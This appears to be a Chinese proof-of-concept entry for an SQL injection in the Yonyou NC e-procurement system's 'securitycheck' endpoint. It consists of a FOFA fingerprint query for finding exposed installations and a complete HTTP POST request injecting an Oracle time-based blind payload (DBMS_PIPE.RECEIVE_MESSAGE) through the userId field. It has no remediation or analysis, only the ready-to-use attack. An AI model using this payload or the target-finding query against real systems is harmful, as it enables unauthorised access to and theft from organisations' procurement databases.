## 用友nc电子采购信息系统securitycheck存在sql注入



## fofa

```
body="UClient.dmg"
```



## poc

```
POST /ebs/securitycheck HTTP/1.1
Host: ip
Content-Length: 237
Method: POST securitycheck HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Accept: */*
Origin: http://ip
Referer: http://ip/ebs/core/login/login.jsp
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=691A17DA3C872E1E35BACBE499022DE4.server; JSESSIONID=D80A3F043CD6E898C2076206848019D9.server
Connection: close

&accountCode=ERP%E7%B3%BB%E7%BB%9F&accountCodeValue=0001&datasource=design&corpCode=&maxWindow=0&compressStream=1&corpName=&workdate=123-09-22&userId=11' AND 1129=DBMS_PIPE.RECEIVE_MESSAGE(CHR(106)||CHR(121)||CHR(69)||CHR(110),5) AND 'Fjnc'='Fjnc&password=11&&pageUniqueId=328c7f3e-aea1-4bcf-bd91-05e0d2804719&pageId=login&isAjax=1
```

![image-20240525131651949](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405251316035.png)